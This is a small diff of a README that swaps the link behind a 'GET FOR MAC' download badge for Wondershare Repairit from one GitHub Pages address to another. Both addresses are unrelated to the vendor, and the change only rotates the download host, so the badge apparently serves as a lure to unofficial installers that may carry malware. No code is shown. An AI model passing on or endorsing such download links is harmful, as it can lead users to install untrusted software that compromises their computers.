@@ -8,7 +8,7 @@
 
 <div align="center">  
 
-[![Get for MacOS](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://software-osx-deploy.github.io/.github/WondershareRepairit)  
+[![Get for MacOS](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://evpatiy-kolovrat-software.github.io/.github/WondershareRepairit)  
 
 </div>  
 
